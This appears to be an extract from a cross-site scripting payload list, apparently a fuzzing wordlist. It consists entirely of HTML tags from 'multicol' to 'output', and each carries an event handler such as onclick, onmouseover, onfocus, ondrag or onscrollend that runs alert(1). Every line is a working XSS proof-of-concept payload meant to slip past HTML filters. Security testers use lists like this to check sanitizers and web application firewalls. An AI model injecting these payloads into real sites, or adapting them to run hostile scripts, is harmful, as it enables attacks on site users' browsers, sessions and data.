<multicol onbeforecopy="alert(1)" contenteditable>test</multicol>
<multicol onbeforecut="alert(1)" contenteditable>test</multicol>
<multicol onbeforescriptexecute=alert(1)><script>1</script>
<multicol onblur=alert(1) id=x tabindex=1 style=display:block>test</multicol><input value=clickme>
<multicol onclick="alert(1)" style=display:block>test</multicol>
<multicol oncontextmenu="alert(1)" style=display:block>test</multicol>
<multicol oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<multicol oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<multicol ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</multicol>
<multicol onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</multicol><input value=clickme>
<multicol onkeydown="alert(1)" contenteditable style=display:block>test</multicol>
<multicol onkeypress="alert(1)" contenteditable style=display:block>test</multicol>
<multicol onkeyup="alert(1)" contenteditable style=display:block>test</multicol>
<multicol onmousedown="alert(1)" style=display:block>test</multicol>
<multicol onmouseenter="alert(1)" style=display:block>test</multicol>
<multicol onmouseleave="alert(1)" style=display:block>test</multicol>
<multicol onmousemove="alert(1)" style=display:block>test</multicol>
<multicol onmouseout="alert(1)" style=display:block>test</multicol>
<multicol onmouseover="alert(1)" style=display:block>test</multicol>
<multicol onmouseup="alert(1)" style=display:block>test</multicol>
<multicol onmousewheel=alert(1) style=display:block>requires scrolling
<multicol onpaste="alert(1)" contenteditable>test</multicol>
<multicol onpointerdown=alert(1) style=display:block>XSS</multicol>
<multicol onpointerenter=alert(1) style=display:block>XSS</multicol>
<multicol onpointerleave=alert(1) style=display:block>XSS</multicol>
<multicol onpointermove=alert(1) style=display:block>XSS</multicol>
<multicol onpointerout=alert(1) style=display:block>XSS</multicol>
<multicol onpointerover=alert(1) style=display:block>XSS</multicol>
<multicol onpointerrawupdate=alert(1) style=display:block>XSS</multicol>
<multicol onpointerup=alert(1) style=display:block>XSS</multicol>
<multicol onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></multicol>
<nav contenteditable onbeforeinput=alert(1)>test
<nav draggable="true" ondrag="alert(1)" style=display:block>test</nav>
<nav draggable="true" ondragend="alert(1)" style=display:block>test</nav>
<nav draggable="true" ondragenter="alert(1)" style=display:block>test</nav>
<nav draggable="true" ondragleave="alert(1)" style=display:block>test</nav>
<nav draggable="true" ondragstart="alert(1)" style=display:block>test</nav>
<nav id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></nav>
<nav id=x tabindex=1 onfocus=alert(1)></nav>
<nav id=x tabindex=1 onfocusin=alert(1)></nav>
<nav onafterscriptexecute=alert(1)><script>1</script>
<nav onbeforecopy="alert(1)" contenteditable>test</nav>
<nav onbeforecut="alert(1)" contenteditable>test</nav>
<nav onbeforescriptexecute=alert(1)><script>1</script>
<nav onblur=alert(1) id=x tabindex=1 style=display:block>test</nav><input value=clickme>
<nav onclick="alert(1)" style=display:block>test</nav>
<nav oncontextmenu="alert(1)" style=display:block>test</nav>
<nav oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<nav oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<nav ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</nav>
<nav onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</nav><input value=clickme>
<nav onkeydown="alert(1)" contenteditable style=display:block>test</nav>
<nav onkeypress="alert(1)" contenteditable style=display:block>test</nav>
<nav onkeyup="alert(1)" contenteditable style=display:block>test</nav>
<nav onmousedown="alert(1)" style=display:block>test</nav>
<nav onmouseenter="alert(1)" style=display:block>test</nav>
<nav onmouseleave="alert(1)" style=display:block>test</nav>
<nav onmousemove="alert(1)" style=display:block>test</nav>
<nav onmouseout="alert(1)" style=display:block>test</nav>
<nav onmouseover="alert(1)" style=display:block>test</nav>
<nav onmouseup="alert(1)" style=display:block>test</nav>
<nav onmousewheel=alert(1) style=display:block>requires scrolling
<nav onpaste="alert(1)" contenteditable>test</nav>
<nav onpointerdown=alert(1) style=display:block>XSS</nav>
<nav onpointerenter=alert(1) style=display:block>XSS</nav>
<nav onpointerleave=alert(1) style=display:block>XSS</nav>
<nav onpointermove=alert(1) style=display:block>XSS</nav>
<nav onpointerout=alert(1) style=display:block>XSS</nav>
<nav onpointerover=alert(1) style=display:block>XSS</nav>
<nav onpointerrawupdate=alert(1) style=display:block>XSS</nav>
<nav onpointerup=alert(1) style=display:block>XSS</nav>
<nav onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></nav>
<nextid contenteditable onbeforeinput=alert(1)>test
<nextid draggable="true" ondrag="alert(1)" style=display:block>test</nextid>
<nextid draggable="true" ondragend="alert(1)" style=display:block>test</nextid>
<nextid draggable="true" ondragenter="alert(1)" style=display:block>test</nextid>
<nextid draggable="true" ondragleave="alert(1)" style=display:block>test</nextid>
<nextid draggable="true" ondragstart="alert(1)" style=display:block>test</nextid>
<nextid id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></nextid>
<nextid id=x tabindex=1 onfocus=alert(1)></nextid>
<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
<nextid onafterscriptexecute=alert(1)><script>1</script>
<nextid onbeforecopy="alert(1)" contenteditable>test</nextid>
<nextid onbeforecut="alert(1)" contenteditable>test</nextid>
<nextid onbeforescriptexecute=alert(1)><script>1</script>
<nextid onblur=alert(1) id=x tabindex=1 style=display:block>test</nextid><input value=clickme>
<nextid onclick="alert(1)" style=display:block>test</nextid>
<nextid oncontextmenu="alert(1)" style=display:block>test</nextid>
<nextid oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<nextid oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<nextid ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</nextid>
<nextid onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</nextid><input value=clickme>
<nextid onkeydown="alert(1)" contenteditable style=display:block>test</nextid>
<nextid onkeypress="alert(1)" contenteditable style=display:block>test</nextid>
<nextid onkeyup="alert(1)" contenteditable style=display:block>test</nextid>
<nextid onmousedown="alert(1)" style=display:block>test</nextid>
<nextid onmouseenter="alert(1)" style=display:block>test</nextid>
<nextid onmouseleave="alert(1)" style=display:block>test</nextid>
<nextid onmousemove="alert(1)" style=display:block>test</nextid>
<nextid onmouseout="alert(1)" style=display:block>test</nextid>
<nextid onmouseover="alert(1)" style=display:block>test</nextid>
<nextid onmouseup="alert(1)" style=display:block>test</nextid>
<nextid onmousewheel=alert(1) style=display:block>requires scrolling
<nextid onpaste="alert(1)" contenteditable>test</nextid>
<nextid onpointerdown=alert(1) style=display:block>XSS</nextid>
<nextid onpointerenter=alert(1) style=display:block>XSS</nextid>
<nextid onpointerleave=alert(1) style=display:block>XSS</nextid>
<nextid onpointermove=alert(1) style=display:block>XSS</nextid>
<nextid onpointerout=alert(1) style=display:block>XSS</nextid>
<nextid onpointerover=alert(1) style=display:block>XSS</nextid>
<nextid onpointerrawupdate=alert(1) style=display:block>XSS</nextid>
<nextid onpointerup=alert(1) style=display:block>XSS</nextid>
<nextid onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></nextid>
<nobr contenteditable onbeforeinput=alert(1)>test
<nobr draggable="true" ondrag="alert(1)" style=display:block>test</nobr>
<nobr draggable="true" ondragend="alert(1)" style=display:block>test</nobr>
<nobr draggable="true" ondragenter="alert(1)" style=display:block>test</nobr>
<nobr draggable="true" ondragleave="alert(1)" style=display:block>test</nobr>
<nobr draggable="true" ondragstart="alert(1)" style=display:block>test</nobr>
<nobr id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></nobr>
<nobr id=x tabindex=1 onfocus=alert(1)></nobr>
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>
<nobr onafterscriptexecute=alert(1)><script>1</script>
<nobr onbeforecopy="alert(1)" contenteditable>test</nobr>
<nobr onbeforecut="alert(1)" contenteditable>test</nobr>
<nobr onbeforescriptexecute=alert(1)><script>1</script>
<nobr onblur=alert(1) id=x tabindex=1 style=display:block>test</nobr><input value=clickme>
<nobr onclick="alert(1)" style=display:block>test</nobr>
<nobr oncontextmenu="alert(1)" style=display:block>test</nobr>
<nobr oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<nobr oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<nobr ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</nobr>
<nobr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</nobr><input value=clickme>
<nobr onkeydown="alert(1)" contenteditable style=display:block>test</nobr>
<nobr onkeypress="alert(1)" contenteditable style=display:block>test</nobr>
<nobr onkeyup="alert(1)" contenteditable style=display:block>test</nobr>
<nobr onmousedown="alert(1)" style=display:block>test</nobr>
<nobr onmouseenter="alert(1)" style=display:block>test</nobr>
<nobr onmouseleave="alert(1)" style=display:block>test</nobr>
<nobr onmousemove="alert(1)" style=display:block>test</nobr>
<nobr onmouseout="alert(1)" style=display:block>test</nobr>
<nobr onmouseover="alert(1)" style=display:block>test</nobr>
<nobr onmouseup="alert(1)" style=display:block>test</nobr>
<nobr onmousewheel=alert(1) style=display:block>requires scrolling
<nobr onpaste="alert(1)" contenteditable>test</nobr>
<nobr onpointerdown=alert(1) style=display:block>XSS</nobr>
<nobr onpointerenter=alert(1) style=display:block>XSS</nobr>
<nobr onpointerleave=alert(1) style=display:block>XSS</nobr>
<nobr onpointermove=alert(1) style=display:block>XSS</nobr>
<nobr onpointerout=alert(1) style=display:block>XSS</nobr>
<nobr onpointerover=alert(1) style=display:block>XSS</nobr>
<nobr onpointerrawupdate=alert(1) style=display:block>XSS</nobr>
<nobr onpointerup=alert(1) style=display:block>XSS</nobr>
<nobr onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></nobr>
<noembed contenteditable onbeforeinput=alert(1)>test
<noembed draggable="true" ondrag="alert(1)" style=display:block>test</noembed>
<noembed draggable="true" ondragend="alert(1)" style=display:block>test</noembed>
<noembed draggable="true" ondragenter="alert(1)" style=display:block>test</noembed>
<noembed draggable="true" ondragleave="alert(1)" style=display:block>test</noembed>
<noembed draggable="true" ondragstart="alert(1)" style=display:block>test</noembed>
<noembed id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></noembed>
<noembed id=x tabindex=1 onfocus=alert(1)></noembed>
<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
<noembed onafterscriptexecute=alert(1)><script>1</script>
<noembed onbeforecopy="alert(1)" contenteditable>test</noembed>
<noembed onbeforecut="alert(1)" contenteditable>test</noembed>
<noembed onbeforescriptexecute=alert(1)><script>1</script>
<noembed onblur=alert(1) id=x tabindex=1 style=display:block>test</noembed><input value=clickme>
<noembed onclick="alert(1)" style=display:block>test</noembed>
<noembed oncontextmenu="alert(1)" style=display:block>test</noembed>
<noembed oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<noembed oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<noembed ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</noembed>
<noembed onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</noembed><input value=clickme>
<noembed onkeydown="alert(1)" contenteditable style=display:block>test</noembed>
<noembed onkeypress="alert(1)" contenteditable style=display:block>test</noembed>
<noembed onkeyup="alert(1)" contenteditable style=display:block>test</noembed>
<noembed onmousedown="alert(1)" style=display:block>test</noembed>
<noembed onmouseenter="alert(1)" style=display:block>test</noembed>
<noembed onmouseleave="alert(1)" style=display:block>test</noembed>
<noembed onmousemove="alert(1)" style=display:block>test</noembed>
<noembed onmouseout="alert(1)" style=display:block>test</noembed>
<noembed onmouseover="alert(1)" style=display:block>test</noembed>
<noembed onmouseup="alert(1)" style=display:block>test</noembed>
<noembed onmousewheel=alert(1) style=display:block>requires scrolling
<noembed onpaste="alert(1)" contenteditable>test</noembed>
<noembed onpointerdown=alert(1) style=display:block>XSS</noembed>
<noembed onpointerenter=alert(1) style=display:block>XSS</noembed>
<noembed onpointerleave=alert(1) style=display:block>XSS</noembed>
<noembed onpointermove=alert(1) style=display:block>XSS</noembed>
<noembed onpointerout=alert(1) style=display:block>XSS</noembed>
<noembed onpointerover=alert(1) style=display:block>XSS</noembed>
<noembed onpointerrawupdate=alert(1) style=display:block>XSS</noembed>
<noembed onpointerup=alert(1) style=display:block>XSS</noembed>
<noembed onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></noembed>
<noframes contenteditable onbeforeinput=alert(1)>test
<noframes draggable="true" ondrag="alert(1)" style=display:block>test</noframes>
<noframes draggable="true" ondragend="alert(1)" style=display:block>test</noframes>
<noframes draggable="true" ondragenter="alert(1)" style=display:block>test</noframes>
<noframes draggable="true" ondragleave="alert(1)" style=display:block>test</noframes>
<noframes draggable="true" ondragstart="alert(1)" style=display:block>test</noframes>
<noframes id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></noframes>
<noframes id=x tabindex=1 onfocus=alert(1)></noframes>
<noframes id=x tabindex=1 onfocusin=alert(1)></noframes>
<noframes onafterscriptexecute=alert(1)><script>1</script>
<noframes onbeforecopy="alert(1)" contenteditable>test</noframes>
<noframes onbeforecut="alert(1)" contenteditable>test</noframes>
<noframes onbeforescriptexecute=alert(1)><script>1</script>
<noframes onblur=alert(1) id=x tabindex=1 style=display:block>test</noframes><input value=clickme>
<noframes onclick="alert(1)" style=display:block>test</noframes>
<noframes oncontextmenu="alert(1)" style=display:block>test</noframes>
<noframes oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<noframes oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<noframes ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</noframes>
<noframes onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</noframes><input value=clickme>
<noframes onkeydown="alert(1)" contenteditable style=display:block>test</noframes>
<noframes onkeypress="alert(1)" contenteditable style=display:block>test</noframes>
<noframes onkeyup="alert(1)" contenteditable style=display:block>test</noframes>
<noframes onmousedown="alert(1)" style=display:block>test</noframes>
<noframes onmouseenter="alert(1)" style=display:block>test</noframes>
<noframes onmouseleave="alert(1)" style=display:block>test</noframes>
<noframes onmousemove="alert(1)" style=display:block>test</noframes>
<noframes onmouseout="alert(1)" style=display:block>test</noframes>
<noframes onmouseover="alert(1)" style=display:block>test</noframes>
<noframes onmouseup="alert(1)" style=display:block>test</noframes>
<noframes onmousewheel=alert(1) style=display:block>requires scrolling
<noframes onpaste="alert(1)" contenteditable>test</noframes>
<noframes onpointerdown=alert(1) style=display:block>XSS</noframes>
<noframes onpointerenter=alert(1) style=display:block>XSS</noframes>
<noframes onpointerleave=alert(1) style=display:block>XSS</noframes>
<noframes onpointermove=alert(1) style=display:block>XSS</noframes>
<noframes onpointerout=alert(1) style=display:block>XSS</noframes>
<noframes onpointerover=alert(1) style=display:block>XSS</noframes>
<noframes onpointerrawupdate=alert(1) style=display:block>XSS</noframes>
<noframes onpointerup=alert(1) style=display:block>XSS</noframes>
<noframes onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></noframes>
<noscript contenteditable onbeforeinput=alert(1)>test
<noscript draggable="true" ondrag="alert(1)" style=display:block>test</noscript>
<noscript draggable="true" ondragend="alert(1)" style=display:block>test</noscript>
<noscript draggable="true" ondragenter="alert(1)" style=display:block>test</noscript>
<noscript draggable="true" ondragleave="alert(1)" style=display:block>test</noscript>
<noscript draggable="true" ondragstart="alert(1)" style=display:block>test</noscript>
<noscript id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></noscript>
<noscript id=x tabindex=1 onfocus=alert(1)></noscript>
<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>
<noscript onafterscriptexecute=alert(1)><script>1</script>
<noscript onbeforecopy="alert(1)" contenteditable>test</noscript>
<noscript onbeforecut="alert(1)" contenteditable>test</noscript>
<noscript onbeforescriptexecute=alert(1)><script>1</script>
<noscript onblur=alert(1) id=x tabindex=1 style=display:block>test</noscript><input value=clickme>
<noscript onclick="alert(1)" style=display:block>test</noscript>
<noscript oncontextmenu="alert(1)" style=display:block>test</noscript>
<noscript oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<noscript oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<noscript ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</noscript>
<noscript onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</noscript><input value=clickme>
<noscript onkeydown="alert(1)" contenteditable style=display:block>test</noscript>
<noscript onkeypress="alert(1)" contenteditable style=display:block>test</noscript>
<noscript onkeyup="alert(1)" contenteditable style=display:block>test</noscript>
<noscript onmousedown="alert(1)" style=display:block>test</noscript>
<noscript onmouseenter="alert(1)" style=display:block>test</noscript>
<noscript onmouseleave="alert(1)" style=display:block>test</noscript>
<noscript onmousemove="alert(1)" style=display:block>test</noscript>
<noscript onmouseout="alert(1)" style=display:block>test</noscript>
<noscript onmouseover="alert(1)" style=display:block>test</noscript>
<noscript onmouseup="alert(1)" style=display:block>test</noscript>
<noscript onmousewheel=alert(1) style=display:block>requires scrolling
<noscript onpaste="alert(1)" contenteditable>test</noscript>
<noscript onpointerdown=alert(1) style=display:block>XSS</noscript>
<noscript onpointerenter=alert(1) style=display:block>XSS</noscript>
<noscript onpointerleave=alert(1) style=display:block>XSS</noscript>
<noscript onpointermove=alert(1) style=display:block>XSS</noscript>
<noscript onpointerout=alert(1) style=display:block>XSS</noscript>
<noscript onpointerover=alert(1) style=display:block>XSS</noscript>
<noscript onpointerrawupdate=alert(1) style=display:block>XSS</noscript>
<noscript onpointerup=alert(1) style=display:block>XSS</noscript>
<noscript onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></noscript>
<object contenteditable onbeforeinput=alert(1)>test
<object data=/ onload=alert(1)>
<object draggable="true" ondrag="alert(1)" style=display:block>test</object>
<object draggable="true" ondragend="alert(1)" style=display:block>test</object>
<object draggable="true" ondragenter="alert(1)" style=display:block>test</object>
<object draggable="true" ondragleave="alert(1)" style=display:block>test</object>
<object draggable="true" ondragstart="alert(1)" style=display:block>test</object>
<object id=x onfocus=alert(1) type=text/html>
<object id=x onfocusin=alert(1) type=text/html>
<object id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></object>
<object onafterscriptexecute=alert(1)><script>1</script>
<object onbeforecopy="alert(1)" contenteditable>test</object>
<object onbeforecut="alert(1)" contenteditable>test</object>
<object onbeforescriptexecute=alert(1)><script>1</script>
<object onblur=alert(1) id=x tabindex=1 style=display:block>test</object><input value=clickme>
<object onclick="alert(1)" style=display:block>test</object>
<object oncontextmenu="alert(1)" style=display:block>test</object>
<object oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<object oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<object ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</object>
<object onerror=alert(1) data=1 type=image/gif>
<object onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</object><input value=clickme>
<object onkeydown="alert(1)" contenteditable style=display:block>test</object>
<object onkeypress="alert(1)" contenteditable style=display:block>test</object>
<object onkeyup="alert(1)" contenteditable style=display:block>test</object>
<object onmousedown="alert(1)" style=display:block>test</object>
<object onmouseenter="alert(1)" style=display:block>test</object>
<object onmouseleave="alert(1)" style=display:block>test</object>
<object onmousemove="alert(1)" style=display:block>test</object>
<object onmouseout="alert(1)" style=display:block>test</object>
<object onmouseover="alert(1)" style=display:block>test</object>
<object onmouseup="alert(1)" style=display:block>test</object>
<object onmousewheel=alert(1) style=display:block>requires scrolling
<object onpaste="alert(1)" contenteditable>test</object>
<object onpointerdown=alert(1) style=display:block>XSS</object>
<object onpointerenter=alert(1) style=display:block>XSS</object>
<object onpointerleave=alert(1) style=display:block>XSS</object>
<object onpointermove=alert(1) style=display:block>XSS</object>
<object onpointerout=alert(1) style=display:block>XSS</object>
<object onpointerover=alert(1) style=display:block>XSS</object>
<object onpointerrawupdate=alert(1) style=display:block>XSS</object>
<object onpointerup=alert(1) style=display:block>XSS</object>
<object onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></object>
<ol contenteditable onbeforeinput=alert(1)>test
<ol draggable="true" ondrag="alert(1)" style=display:block>test</ol>
<ol draggable="true" ondragend="alert(1)" style=display:block>test</ol>
<ol draggable="true" ondragenter="alert(1)" style=display:block>test</ol>
<ol draggable="true" ondragleave="alert(1)" style=display:block>test</ol>
<ol draggable="true" ondragstart="alert(1)" style=display:block>test</ol>
<ol id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></ol>
<ol id=x tabindex=1 onfocus=alert(1)></ol>
<ol id=x tabindex=1 onfocusin=alert(1)></ol>
<ol onafterscriptexecute=alert(1)><script>1</script>
<ol onbeforecopy="alert(1)" contenteditable>test</ol>
<ol onbeforecut="alert(1)" contenteditable>test</ol>
<ol onbeforescriptexecute=alert(1)><script>1</script>
<ol onblur=alert(1) id=x tabindex=1 style=display:block>test</ol><input value=clickme>
<ol onclick="alert(1)" style=display:block>test</ol>
<ol oncontextmenu="alert(1)" style=display:block>test</ol>
<ol oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<ol oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<ol ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</ol>
<ol onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</ol><input value=clickme>
<ol onkeydown="alert(1)" contenteditable style=display:block>test</ol>
<ol onkeypress="alert(1)" contenteditable style=display:block>test</ol>
<ol onkeyup="alert(1)" contenteditable style=display:block>test</ol>
<ol onmousedown="alert(1)" style=display:block>test</ol>
<ol onmouseenter="alert(1)" style=display:block>test</ol>
<ol onmouseleave="alert(1)" style=display:block>test</ol>
<ol onmousemove="alert(1)" style=display:block>test</ol>
<ol onmouseout="alert(1)" style=display:block>test</ol>
<ol onmouseover="alert(1)" style=display:block>test</ol>
<ol onmouseup="alert(1)" style=display:block>test</ol>
<ol onmousewheel=alert(1) style=display:block>requires scrolling
<ol onpaste="alert(1)" contenteditable>test</ol>
<ol onpointerdown=alert(1) style=display:block>XSS</ol>
<ol onpointerenter=alert(1) style=display:block>XSS</ol>
<ol onpointerleave=alert(1) style=display:block>XSS</ol>
<ol onpointermove=alert(1) style=display:block>XSS</ol>
<ol onpointerout=alert(1) style=display:block>XSS</ol>
<ol onpointerover=alert(1) style=display:block>XSS</ol>
<ol onpointerrawupdate=alert(1) style=display:block>XSS</ol>
<ol onpointerup=alert(1) style=display:block>XSS</ol>
<ol onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></ol>
<optgroup contenteditable onbeforeinput=alert(1)>test
<optgroup draggable="true" ondrag="alert(1)" style=display:block>test</optgroup>
<optgroup draggable="true" ondragend="alert(1)" style=display:block>test</optgroup>
<optgroup draggable="true" ondragenter="alert(1)" style=display:block>test</optgroup>
<optgroup draggable="true" ondragleave="alert(1)" style=display:block>test</optgroup>
<optgroup draggable="true" ondragstart="alert(1)" style=display:block>test</optgroup>
<optgroup id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></optgroup>
<optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>
<optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>
<optgroup onafterscriptexecute=alert(1)><script>1</script>
<optgroup onbeforecopy="alert(1)" contenteditable>test</optgroup>
<optgroup onbeforecut="alert(1)" contenteditable>test</optgroup>
<optgroup onbeforescriptexecute=alert(1)><script>1</script>
<optgroup onblur=alert(1) id=x tabindex=1 style=display:block>test</optgroup><input value=clickme>
<optgroup onclick="alert(1)" style=display:block>test</optgroup>
<optgroup oncontextmenu="alert(1)" style=display:block>test</optgroup>
<optgroup oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<optgroup oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<optgroup ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</optgroup>
<optgroup onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</optgroup><input value=clickme>
<optgroup onkeydown="alert(1)" contenteditable style=display:block>test</optgroup>
<optgroup onkeypress="alert(1)" contenteditable style=display:block>test</optgroup>
<optgroup onkeyup="alert(1)" contenteditable style=display:block>test</optgroup>
<optgroup onmousedown="alert(1)" style=display:block>test</optgroup>
<optgroup onmouseenter="alert(1)" style=display:block>test</optgroup>
<optgroup onmouseleave="alert(1)" style=display:block>test</optgroup>
<optgroup onmousemove="alert(1)" style=display:block>test</optgroup>
<optgroup onmouseout="alert(1)" style=display:block>test</optgroup>
<optgroup onmouseover="alert(1)" style=display:block>test</optgroup>
<optgroup onmouseup="alert(1)" style=display:block>test</optgroup>
<optgroup onmousewheel=alert(1) style=display:block>requires scrolling
<optgroup onpaste="alert(1)" contenteditable>test</optgroup>
<optgroup onpointerdown=alert(1) style=display:block>XSS</optgroup>
<optgroup onpointerenter=alert(1) style=display:block>XSS</optgroup>
<optgroup onpointerleave=alert(1) style=display:block>XSS</optgroup>
<optgroup onpointermove=alert(1) style=display:block>XSS</optgroup>
<optgroup onpointerout=alert(1) style=display:block>XSS</optgroup>
<optgroup onpointerover=alert(1) style=display:block>XSS</optgroup>
<optgroup onpointerrawupdate=alert(1) style=display:block>XSS</optgroup>
<optgroup onpointerup=alert(1) style=display:block>XSS</optgroup>
<optgroup onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></optgroup>
<option contenteditable onbeforeinput=alert(1)>test
<option draggable="true" ondrag="alert(1)" style=display:block>test</option>
<option draggable="true" ondragend="alert(1)" style=display:block>test</option>
<option draggable="true" ondragenter="alert(1)" style=display:block>test</option>
<option draggable="true" ondragleave="alert(1)" style=display:block>test</option>
<option draggable="true" ondragstart="alert(1)" style=display:block>test</option>
<option id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></option>
<option id=x tabindex=1 onfocus=alert(1)></option>
<option id=x tabindex=1 onfocusin=alert(1)></option>
<option onafterscriptexecute=alert(1)><script>1</script>
<option onbeforecopy="alert(1)" contenteditable>test</option>
<option onbeforecut="alert(1)" contenteditable>test</option>
<option onbeforescriptexecute=alert(1)><script>1</script>
<option onblur=alert(1) id=x tabindex=1 style=display:block>test</option><input value=clickme>
<option onclick="alert(1)" style=display:block>test</option>
<option oncontextmenu="alert(1)" style=display:block>test</option>
<option oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<option oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<option ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</option>
<option onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</option><input value=clickme>
<option onkeydown="alert(1)" contenteditable style=display:block>test</option>
<option onkeypress="alert(1)" contenteditable style=display:block>test</option>
<option onkeyup="alert(1)" contenteditable style=display:block>test</option>
<option onmousedown="alert(1)" style=display:block>test</option>
<option onmouseenter="alert(1)" style=display:block>test</option>
<option onmouseleave="alert(1)" style=display:block>test</option>
<option onmousemove="alert(1)" style=display:block>test</option>
<option onmouseout="alert(1)" style=display:block>test</option>
<option onmouseover="alert(1)" style=display:block>test</option>
<option onmouseup="alert(1)" style=display:block>test</option>
<option onmousewheel=alert(1) style=display:block>requires scrolling
<option onpaste="alert(1)" contenteditable>test</option>
<option onpointerdown=alert(1) style=display:block>XSS</option>
<option onpointerenter=alert(1) style=display:block>XSS</option>
<option onpointerleave=alert(1) style=display:block>XSS</option>
<option onpointermove=alert(1) style=display:block>XSS</option>
<option onpointerout=alert(1) style=display:block>XSS</option>
<option onpointerover=alert(1) style=display:block>XSS</option>
<option onpointerrawupdate=alert(1) style=display:block>XSS</option>
<option onpointerup=alert(1) style=display:block>XSS</option>
<option onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></option>
<output contenteditable onbeforeinput=alert(1)>test
